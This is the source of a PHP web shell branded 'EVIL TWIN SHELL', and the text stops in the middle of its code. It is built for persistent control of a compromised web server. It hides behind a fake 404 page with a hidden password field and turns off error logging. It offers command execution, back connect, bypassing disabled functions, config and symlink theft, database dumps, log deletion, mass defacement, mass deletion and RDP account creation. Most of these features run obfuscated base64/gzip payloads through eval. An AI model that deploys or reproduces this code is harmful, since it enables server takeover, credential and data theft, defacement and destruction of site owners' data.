<?php
@error_reporting(0);
@set_time_limit(0);
	if(version_compare(PHP_VERSION, '5.3.0', '<')) {
		@set_magic_quotes_runtime(0);
}
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);

if(get_magic_quotes_gpc()) {
function VEstripslashes($array) {
return is_array($array) ? array_map('VEstripslashes', $array) : stripslashes($array);} 	
$_POST = VEstripslashes($_POST); 
$_COOKIE = VEstripslashes($_COOKIE); } 
function Login() {
	die("<html><title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p><hr>
<style>input { margin:0;background-color:#fff;border:1px solid #fff; }</style>
<pre align=center><form method=post><input type=password name=pass></form></pre></html>");
}
function VEsetcookie($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}
if(!empty($auth_pass)) {
    if(isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass))
        VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
        Login();
}
echo '<!DOCTYPE HTML>
<html dir="auto" lang="en-US">
<head>
<meta charset="UTF-8">
<meta name="robots" content="noindex, nofollow">
<meta name="theme-color" content="#434343">
<title>404 Not Found</title>
<link href="https://fonts.googleapis.com/css2?family=Metal+Mania&display=swap" rel="stylesheet">
<link href="https://fonts.googleapis.com/css2?family=Philosopher&display=swap" rel="stylesheet">
<link href="https://raw.githubusercontent.com/eviltwin-dev/eviltwin-dev.github.io/master/Sec666-Fadly31337.jpg" rel="icon" type="image/jpeg">
<style>
body{
font-family: "Philosopher", sans-serif;
background-color:#1E1E1E;
color:white;
}
#content tr:hover{
background-color:#434343;
}
.EviL {
background-color:#434343;
}
.pejoe {
background: #434343;
padding:6px 6px;
border-radius:6px;
}
.pejoe:hover {
background-color:#F30A00;
color:#FFFFFF;
}
.evil {
background: transparent;
}
.evil:hover {
background-color: transparent;
color:#FF2100;
}
.we {
color: red;
font-size: 35px;
font-family: "Metal Mania", cursive;
text-shadow: 0px 2px 0px #8A8A8A;
}
table{
border: 1px white solid;
}
a{
color:white;
text-decoration: none;
}
a:hover{
color:white;
}
input,select,textarea{
border: 1px #7B7B7B solid;
-moz-border-radius: 4px;
-webkit-border-radius:4px;
border-radius:4px;
}
</style>
</head>
<body>
<center><span class="we"><a href="?" class="evil">$ EVIL TWIN SHELL $</a></span></center>
<table width="780" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td><font>Path : </font> ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
$sys = php_uname();
$home_r = $_SERVER['DOCUMENT_ROOT'];
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$ipmu = gethostbyname($_SERVER['REMOTE_ADDR']);
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? '<font size=2 >ON</font>' : '<font size=2 >OFF</font>';
$ds = @ini_get("disable_functions");
$show_ds = (!empty($ds)) ? "<font size=2 color=#B0B0B0>$ds</font>" : "<font size=2 color=#B0B0B0>NONE</font>";
$mysql = (function_exists('mysql_connect')) ? "<font size=2 color=#B0B0B0>ON</font>" : "<font size=2 color=#B0B0B0>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font size=2 color=#B0B0B0>ON</font>" : "<font size=2 color=#B0B0B0>OFF</font>";
$wget = (exe('wget --help')) ? "<font size=2 color=#B0B0B0>ON</font>" : "<font size=2 color=#B0B0B0>OFF</font>";
$perl = (exe('perl --help')) ? "<font size=2 color=#B0B0B0>ON</font>" : "<font size=2  color=#B0B0B0>OFF</font>";
$python = (exe('python --help')) ? "<font size=2 color=#B0B0B0>ON</font>" : "<fontsize=2  color=#B0B0B0>OFF</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);
echo "<hr><center>
<a href='?path=$path&evil=admn' class='pejoe'>ADMINER</a>
<a href='?path=$path&evil=aueu' class='pejoe'>AUTO EDIT USER</a>
<a href='?path=$path&evil=bydf' class='pejoe'>BYPASS DISFUNC</a>
<a href='?path=$path&evil=bcon' class='pejoe'>BACK CONNECT</a>
<a href='?path=$path&evil=cmde' class='pejoe'>COMMAND</a>
<a href='?path=$path&evil=cprp' class='pejoe'>CP RES PASS</a>
<a href='?path=$path&evil=csrf' class='pejoe'>CSRF</a><hr color=#1E1E1E>
<a href='?path=$path&evil=conf' class='pejoe'>CONFIG</a>
<a href='?path=$path&evil=crdp' class='pejoe'>CREATE RDP</a>
<a href='?path=$path&evil=dmns' class='pejoe'>DOMAINS</a>
<a href='?path=$path&evil=ddmp' class='pejoe'>DB DUMP</a>
<a href='?path=$path&evil=dlog' class='pejoe'>DEL LOGS</a>
<a href='?path=$path&evil=info' class='pejoe'>INFO</a>
<a href='?path=$path&evil=jump' class='pejoe'>JUMPING</a>
<a href='?path=$path&evil=mdef' class='pejoe'>MASS DEF</a>
<a href='?path=$path&evil=mdel' class='pejoe'>MASS DEL</a><hr color=#1E1E1E>
<a href='?path=$path&evil=syml' class='pejoe'>SYM</a>
<a href='?path=$path&evil=s403' class='pejoe'>SYM 403</a>
<a href='?path=$path&evil=s404' class='pejoe'>SYM 404</a>
<a href='?path=$path&evil=scon' class='pejoe'>SYM CONF</a>
<a href='?path=$path&evil=smtp' class='pejoe'>SMTP</a>
<a href='?path=$path&evil=upld' class='pejoe'>UPLOAD</a>
<a href='?path=$path&evil=vhst' class='pejoe'>VHOST</a>
<a href='?path=$path&evil=zneh' class='pejoe'>ZONE-H</a>
<a href='?path=$path&evil=kill' class='pejoe'>KILL YOUR SELF!</a>
<hr></center>";
if($_GET['evil'] == 'upld') {
eval(gzinflate(base64_decode('jZDRSsMwFIbvB3uHLA7SgS4oXghLA4KbiIOOzl0NGVmb0kDShPRUGLJ3t+lWRQUx5+ZPzsd3wlFFpOpaQjTeLZ6W8/WWFEpL8jqZvA8Hqogy6w4/e1sCxu0qYdp8OXYCyimhZPqLOhGdSWalRZhlsgLpOStsBSiz2vr4YtEdvlktk/sHlDwzGrqc0R4ufY9ez0NxPBsOjlLX8m/x3W2oXjxP0yQd/VN+PIvJp7i84RunrcgZbWM7xxskqwwOTsbYNBqUEx5oeL/KBQiMjITS5jFeJesXzJmqXAPoxIcFYRTW02f6HaibvVGA0ZvQTXt9TEa4JTo7Z3v/9X8y+wA=')));
} elseif($_GET['evil'] == 'info') {
// Source codenya : https://ghostbin.co/paste/nmgfh/raw
eval(gzinflate(base64_decode('lZJLa4NAFIX3hf6HCw1MhGJLl9a46CNJodI0D0pWwehEB9RrZ8YGiz++Mz4KKa1WXTicOed8Vx3qRwjEPmAqwccY+eRiWl0g2Ced3DirQkiagAW1p1Zb6921vh1ijkQhTGLvuWNfaV/7OD/rqqb8g3J4WvS2s8wkv1rqQqdscB0ecLaYt7Bmxh5mkg9/Je9AwcWA9n+wZHD5AxPePqYBTPPUlwxT0U+J8LgLhv+aOSYUloiylxAp544PBqyZAryk0JyBlvKzPvAkHZMAXNjC3GKWIJdSJceGoYgnNM3vJG5EB2eUq93vShhrhQUmMaCEGcc8+zsZ6u3TaFhF/zuYW6xen1W/CiaFeI/VUS9hQXlca5la1VIhI0wbsVpX8tvscV2Lx5DKSrrfLJtCP9dhPQK5/QI=')));
} elseif($_GET['evil'] == 'cmde') {
// Source codenya : https://ghostbin.co/paste/t8b9x/raw
eval(gzinflate(base64_decode('TVHLasMwEDzX4H9YTEDxIbihN1vypR/QQnspJQTF2tiilmQsOY+W/HtXcUp6EcuMZnZGwqZzkPEGbcCx5ns3GjAYOqcEG5wPLGI21M/OGGkVlMCLK5AmXNthChDOAwoW8BQYeP1N89Mjgw512wXB1jRbaQhtZgcy/K/z087ocL/TG/xS2DE4yH4ipKb7RUxVZ1WaPOj9UnuPYbnYvr68vX/+U2zyHH7SBKkQ40ofwIdzjyIzcmy1LdfDqRqkUtq21zkGXslet7acy1dk5cby2OmAVVbzYcSa0c5FYxQIuC+ca2yIojQzKyDL8jS5rYfsQ9oWdmhxBOmPq23MDhcguvd470DanGQxNizcFOKzCMATzlQUXf1uXAWXv35FTMcLqknn7fNi2Msv')));
} elseif($_GET['evil'] == 'conf') {
eval(gzinflate(base64_decode('rZZtb5swEMdfM2nfwUORQqYkbK8qtU2q9UGaprWdVml9UVXoABPcGuzZTkm05rvvDKSQtKuoligJBt/9/Pf5zLlHTUQmJBGS5p7r450vQesidofEVe6ACEViRj33MBG5IZHgQk0UjacnkPcNURRi0vI69K3Z1B0cvH/n9Fi8QHZ2HzPlufSBcVOwPIhEniD9097eXm2mWZCWMtxLaZjINQHO85/095wpSi5ETvMrMEwnS/IlX7qlU9rWvcH2x6mBKKJau0O3qKQkhWKGetZrSNYDlj1Fyjh2VPItcUaN9no4pcGA/EEDhyVNN0p0yeMj+VAaVP0OjVJB3hggO7SzIpRrWlOkorMgAxOlAc7e6/ve+OPRYH+x7/dRcuWNjbmmqpwmm5X6HScROEiUeu2um8+3BDTp2cAENjJrrU7bKsCFsVH3U5FRvzH25TzkLMIYZdyvpJZhYDqw84HQRmyLM3gawenNFIR1F+JBKVh6dZ/zfLBxthxHmBJkMiVuJCGn3B2+Yl6tbQo6rVyuv56PWs9ecW1PS4oRKjQ0N36ldCxTWQF/CCnuWFfQQyyCbcIvIWIhuhLCYlQB9FoKy1kFOhb6moZdQZW3f48b5l6zRs53cY9eMYOuIL522B0y4gxjDZg/NXOuwO71BonreHLVFVek2a44kd4JCbfhPHuWS9g4Pu6K0PiO0n5ME5hz42tqDMtnuoGdqrmEVzfHC9nwhGF51MpxRbWBq1TIrjiQsnyPcREBHy8yXoHOYYbr2jnX74TI+D9T4FvZ+7YJ/iekkPgdbS/btVCxDZHujEEHaR12Q9sBA+IMn2xjLrFenoAynVOSbxOuMEnx/fCGtMF2uUTrjIzBQAiaNswzzpnmELp1SWsVtXYtsRVtXVampJdDButS+FR8nB5kIQp5Kj8J1vcAi3pQv+6xuG+Uz6q0bXlNSL/fYm4U6nKQktqM8dIxpAnIqC11bBamOZhUn0TOra4WdLghqDFd1Y36unKcslHermzbtuoDSaimhxHOmOIVSKpoMukfSTDppGf//Q25/Wl5gJnekNPLizNyWx9UDn3AX01xD/4C')));
} elseif($_GET['evil'] == 'zneh') {
eval(gzinflate(base64_decode('pVRdT9swFH0uEv/BihAuUiEgjZfSREKjSNMQRWl5WlGVJre1hWNHjtMPJv77ru2EbqOaNvYUO773nON77jVfdI9mD6Px5But6nnBDX06Id8PDyBjitBBBtKAjunV4UGnc5SrIuWSRAQ2pVA5dIOpnsqgR1qIWgvM98GSZ88Y+nZm9/TJnTnw4AYWaQaajCRTIu+TQUqYhkVEmTFlPwzX6/XZi5Jwys6UXoapzhhfQSiV4QsOOnIMYVnPBa8Y5NE5JSbVSzARnc1FKp9p/FGkQZjGg7mOgz1yr332B/X+n8ZW107bopaZ4UoSm8u6R+hAz4U6FzvoQ8bQhQz/z7jkphu858tU4Xm2YcXlUkDgLex0iE+swKjSdBGqRz4/Jnejh8ksGU4ek/tJcn0/vh0mPWJ0DX+RZnvhn4JvvwzvbsY9EuS+/r4Qx74VLyJ74WOWZs8F9mN0cawhrZTEhe/maAwyb6+jwdRaejrYQGbJflORCVXB7v+rK7FC0Axr27R/WhHL+lZgV3ms8TsHPDRfdEsNy1mRGgQJwkwJpaNpoCGfBvHo62AaLpQ0MX4Fj0Nux8lBnbQMTQNaZHIak4ELx8Qm760XOq8ERAV/yCKeHKnjYZKMkj0Q7bV/xvJI7WOASLogBRim8oiWqjI0tlFeVzsmOB87cHfMZVkbYrYlRNTAxlAi0wLXfiwq/oLrSxziUiCAfRLQbDpccTGbrLmkOyDP48yo9vBY7BQtI5XZCsRc89ywPvl0eV5urggDvmSmTy7cttVgH65fie2YVDgnK47zVbgZAdRiUMpZyUqUE7ZE+6/YPKcNQbtbpaLG7bjZ7pPYVDO0Zfa2WD8aD8LWBGfZDw==')));
} elseif($_GET['evil'] == 'syml') {
eval(gzinflate(base64_decode('7Vdta9tIEP5u8H+Ybl0kXVzJTukVYsuX0uS4wl0DTXp3kBQjS6tI1/Wu2F1HcdP895tdSY5rOQ6lhVKoPxhp3nd25plRL10wBiEoLaeSFiyKqdubnh6//fv47blzdPLq3V/Hb86mb09Ozpz3fSCkD70i0pk36nZ6yWAe5Vyh+mGaM+qSgOo44NGcJn4seEqMVJ66jaB30+0czj8kuXQJvcqZLnM+Vcs56Q9evHhhhA/jrM21DHqN9hmHpwoCaNiW1TO+n2EQzkmhc4HxvOYJiiv4XTAmytPl/M+cf1DdzlEuaayFXFqBlRU/0/Nu52WSnC0LCppe6wATkXPwi6wAy/kj4gmjcpPZ7ZxGOlfpEl7ypWNjKUwkqSgodx00HMUxVcrpO6VTxVpafilzjYlG6X4Vvjc6TGMmVEU0ojTOBJBuZ6yjGaMQsfyShzHlGsOYCZlQGQ7x2paMhk6ZJzo7+HXwZFRxnsaCCXnw+Jn9jZyJMSPtf/KZpck4FVyDyj/ScH9y6sMb4Y8DQ5uMA508qHEk7MV+ico7ReUXKeD9Mby/DZUAz0NsEcZigcIhDPEtFZJGcbaqOIgU1M+m+LAWqaSXuUs+Ck5Jv2F5NwWSp/NIx9k0Ysx1HhsBIK7/i0ceO/3GiHmojmyuKGULlbl1kWMHMbx0LfO52widD9+fD957Hkxg3/jvLfDwGGohVH49vaS6KBd54truESWnsm6hK8xGpKgKiL9palUZeKEbScPEfJY4Aj406fFR4Z6cM5oiNYJM0jTMtC4OgqAsS3/Tt0+C2n7MIqVCfa0nbZmVl2jNk5EzRz93DDg4VmzFa1w7600fNC9BJuY0aOkHxWLG8niKrcsc0JHEZIbOdMYi/sFphblZQnVsdRHB+k3WCdvbG93e3q5yHdgmtAV3S5mi5i7Pjk/Pwgr4HHtrBborE6eqB3CtwFdA3o+BePAQ5MEOzEPuJuxBg3uwC/gmFZzBLuR4thXPHlDZgk4POWnD0wqc4HN0AnvuVbLIWtXgXCWSeCAk0Otcu+Qdt6fXAowsGMVH9vKhzEzJPUqpwMlq6J4pMuiZOZxiG6iaah1aSKOGFUkZLd2KagK6Qzws34sAke437+LgIgiUgTvVX+luGlpfFUjVnX3cCxoJBAKrcQeJK0MIg8N9+PQJWowwhIFh3LkJgcyw3FtEk7J/h8MgVW3eVSQDls8Cfh8zkkVpSNu5l6LIqGzz1NZArL1k3mYsFJpCmLonhlQX20/FtzGMBoLxdobdtIiHycZtS+d8Qe8ayDTI7rnaGg87q30N841eE0qjSNY9P2CgAfxdeL/hYx3uW2i/6sDonvYzYL6CmaY1NpG9wnWzrQoFjzDD/+Q8EaUi3s0uAL8Hvu/dV++wG2P4vvDd7Xw1gO9A7ww3NyqvMIb6fqgcB0j8Jsj++ui7orqm8wIzQsioh6vaEB8H9mnfAP1gMDBCuIq6NXscguVWr3t7Htz0cO8z300bm6AVqOETNwgkeZUzP4T/RI73c+D0LdknFxyLtkm5M57JYOKMmtCqNdS81CX3HIk2Kjt5NFXax15E5C6rqZIWi2ZyPO/Xioa81jbP0dTaPGuG2TarXzXM2pPs24yxnzPs5wz7oWfYRj9uGWPjIMmv8L+OmowW3Jhda02rdAtm2MGd+jYIfBVxLvDM+EWtKWwCYqMxq8O8tWbx9z8=')));
} elseif($_GET['evil'] == 's403') {
eval(gzinflate(base64_decode('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')));
} elseif($_GET['evil'] == 'jump') {
eval(gzinflate(base64_decode('1Vhbb9s2FH72gP2HM8aA5DUzswF9cSx12PbSYcCGbcAe0kCgJcpiphtIynKw5r/vUNSFvrVF0A5dglgSz4Xnwu/zUeYCAri5/fKLGY+zCsg6ETuIc6ZU4BVMbkW5gpf1Hlijq1svJEZTpH4t+TYqmI4zn9BM1RmXnJJrmCdCLhbwD2rN5o3MFXrn+zqvEu6TN/JNaXSi33794887D8Xe/cI4NB6FUlz7g+yhKWoU9p6G2HBXG8FsllaSM9zdbsIUmJtBvdsad1ZaRpLXOYu5z6Rkjz7JtK5XFEMlbdsuyeIaCIaEirrKq5bLzuHCRoV+uI7RD6F4pTUWpU3IIEpRkFY1L32jdU0kGazaTOTcn2+5Numn5urP0zEZtK15zDK3NCtTF6M4+MAUFJeoYnXvbu5HAZY46oVT7fMqZjnNqoLTznII05Y2Qht/NFxAEASgZcOnkLqSDW5HzSWhZGkkg7feHdY+YRuT5GDlZIe+xIsXt9PTg2xNrHfrtCo1xFhoGVz9cGN+w9/X1KyG97BmkEmeBt6rmuksGD174Tm7UdzbrykLybSnDbOVQr8jzPdE9tenCe1pvOtOtYlhSdYb6egMKv3VXp56oMwRsQhZTATMyhPwXPFDnKCz1yXoSrMctDkewPAPOymWBFDyTdg91N2Gnd/ekE4IO/XrrWNeai5DGxUAJi8LKLjOqiQgdaU0GWW/CKXhp6pgolQrMBGNVprvNcbDoGQFDwhWiyAAH3O8b0WiMyScm5t6fwsZF9tMr+C7l+aRhJ4t0DytR+gdAyCuylRsqUF5QpXQXNnPpd5r4mDUgaiL0Xo6H7Y5ncLtVH+7jKWgQxbhQW6irBsN+rHGZFSzKYQmsGN5g48/I6WJckv6tA3DvTfvLu3ROTX1xuPUt8Eb22d7dUzLuww7oj4nVm75JtplHW/tmKTIwEOQRs92rYrVAASHuqzlOeI6JqRe02U2l42eSUbW6wW8W+FZtB/z0Gl0zyah54Y08s8l+vmErAOJ+D8zD/rYIIR9IuoVJjGQyWfMCbaKJ0Dt55qBQ53pBuchJEmoJLYKyeHc4fqRlZ4GgzhwLPuz1tek51crmggW1cezbw7VIA/A8+DtW/iq0zig4GeE0PO1e4xmEzNGLM99j/rLr18tVvsV9ZD7rD3emK/t6MF2ZRjFJlJzhHff3nf8VjyOq85852oaArOjWjecOQa0bja5iKNMF/nRvOYMWEeuPjazHfu/NNMcqX0Q270r9ucPXx8x4FMudHNJmzLWoiojvkdOUb6HRCP2ER7lum1E4h2mk3SU021pDjyef6MZ4USiEZuqh5kBerI0YwoiZebOq4cODCIOZlULBghC8OECJMrKYEJLwXfcMDBYjx259OnD4nDSPELJGaSQq+67uovbgmaZbK66oWKKd3xSFgmT/wk9rsKAnuThIMcj4NiXuMOi+9+bylZtia9qtqJIpYIpHPTQG1m4W591d7J255ncvHvX0LTj1Da4APfT/jQhBrOmzWm98WeDBfnbXZneCJzb8e6kQ9PX7Ye8Mfy3rw1P0z8SaCJ2uPgv')));
} elseif($_GET['evil'] == 'mdef') {
// Source codenya : https://ghostbin.co/paste/32urb/raw
eval(gzinflate(base64_decode('7VRda9swFH3OYP/h0hmUQImzsb4ksWGjHdvD1kH7VkJQJLnWKkvGUpqEkv8+SZacfm4N3djLCLFlXd1zzz332MVSEsOVBLyQqqmwmFeKsn5CeXOYSFzhggt2mHDN55o0vDYDuHn9qtcrVMMwKfvJD8AaEqGusOYDF+FFn+v5quEGL0SLNAhJPfeAIQNNsLTLNjjxoQ7QH3GYdrGIiT6T2MwDt0h97GASQm1xG/SHhihFw456OGNJ+RzIsgzQEHW4PXdoXi/NnChpmDS6H/AO4XbXAWcLTGh2D+2lcF1yK10Uhgx2sI+peife6xaMlAoOLqaFJQBECdVkbz6O3C8/Pv12Mk1dIJ/FmU0XTR6V3Ju/U5/TtZX+oX3IE/7pUrdhEe7tzV/dxf2LaM69rPnfgP/EgM/2nSOedvq80H+/N5HTav799Oz8AmmDG4NmO5/EgNnUDM3AiRmN3Ena9jWl/Bq02QiWoQo3l1yO4aheA14aNYEaU8rlpd9CsZ17r0QoRZ28aGbb6TZcz7d32h4tz8ltAqllEKB3JnjI/0+x/2vc3Vh2rgsHiB01C0YIW/Z9rKBiplQ0Q7XSBuU26O2VnzHBiAHXNoyDs5yR3AEurX18KEMNplwhsF6zD14kuMZiaR+CTEBKRq4YzU8lA9vcM7M7k+QfhPB5obhn8kkJyppfEjNsbSJyq2qETmpsShSHteLUlGN4fzSq1xMEJeOXpcnQ2xHK75a0Y3BoexT1k4tV2TUXZsXlsC7rvYt/kZStwVF4UN6VxPa7GqoGdzxaIOCP4d3I18s/YzcZWGzgxLKDc0tvmkbARxvUy0XFuxbbtz12+BVrDceswIQ90aCHS53t8mkaDNl9nbY/AQ==')));
} elseif($_GET['evil'] == 'mdel') {
eval(gzinflate(base64_decode('lVNNi9swEL0X+h8G16AEFntLdy/xx6n0UsoW2tsSgmLLsVhZMpaceCn575Vk2fmyt10Hgqx5M+/NvHHR8kxRwaHCUm5ywogiCz+nzZ3PcYULysgS/nz8QIsFlZtDQxXesh6xtAEAMC8YEpAZ5vrYByMbKkRDcFYuegiWFrsdEsElZzrZM4fQhr3oFGXiBUuq4xYXoBAFo7ATTKuzmZAkCaAAnRO4uEnYkI5KJReOa6jjLa/x5mk5o/zlFhtdII/j2xEIk+RKyb+leIGG6+pupoH3v7reTHxb5K0k7e3gXDbJOuH/NHCiR2fiLNw8JCsFeM9xIbiCTDDRJJ8evphf+vQ9Ds11uh7WId42qRfN1nITGmjngT7NO71a16ufne3+dPLx5vY4N3B70v/joZ+Pv/n59Ov3M5IKNwqt7Wj6GcQ53YNUr4wkqMLNjvIVPNYd4FaJCGqc55Tv7BWyQ7hQ76rmxk20voPThelG80QjTah5hilerIWLZ4QrMs7ZXervuYKKqFLkCaqFVCi1Yetb+k2wnDSwcn4Zm/oo5XWrQL3WuidFOoXALG7idMIes1a/+TVWJRp6P9BclSt4eLyvuwhBSeiuVAn6fI/OCve0ujVT713Edh5QM5yR0spOENlTpg6UB3VZv0/GOY1stxUdiXp/hw5/aK/gq/VqhsAVDM2g0zh0Jpwt/PEv')));
} elseif($_GET['evil'] == 'vhst') {
